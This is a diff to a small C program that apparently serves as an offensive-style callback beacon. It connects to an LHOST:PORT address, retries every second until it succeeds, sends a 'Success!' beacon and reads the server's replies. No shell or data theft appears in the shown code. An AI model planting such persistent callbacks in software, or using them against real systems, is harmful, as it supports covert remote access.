@@ -10,8 +10,9 @@
 #include <arpa/inet.h>
 
 int main(int argc, char* argv[]) {
-    char beacon[] = "Success\n";
-    int sockfd = 0,n = 0;
+    char beacon[] = "Success!";
+    char HOST[] = LHOST;
+    int sockfd = 0, n = 0;
     char recvBuff[1024];
     struct sockaddr_in serv_addr;
 
@@ -23,18 +24,16 @@ int main(int argc, char* argv[]) {
 
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(PORT);
-    serv_addr.sin_addr.s_addr = inet_addr("LHOST");
+    serv_addr.sin_addr.s_addr = inet_addr(HOST);
+    printf("[+] Attempting to connect to remote server at %s:%d...", HOST, PORT);
+    fflush(stdout);
 
-    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
-        printf("\n Error : Connect Failed \n");
-        return 1;
+    while (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+        sleep(1);
     }
-    printf("Connected to server!\n");
+    printf("Done!\n[+] Connected to server!\n");
 
-    sleep(5);
-    printf("Sending hello beacon...");
     send(sockfd, beacon, strlen(beacon), 0);
-    printf("done!\n");
 
     while ((n = read(sockfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
         recvBuff[n] = 0;
@@ -45,8 +44,10 @@ int main(int argc, char* argv[]) {
     }
 
     if (n < 0) {
-        printf("\n Connection closed! \n");
+        printf("\n Error reading from socket! Was the connection closed? \n");
+        return -1;
     }
 
+    printf("Connection closed. Exiting...\n");
     return 0;
 }
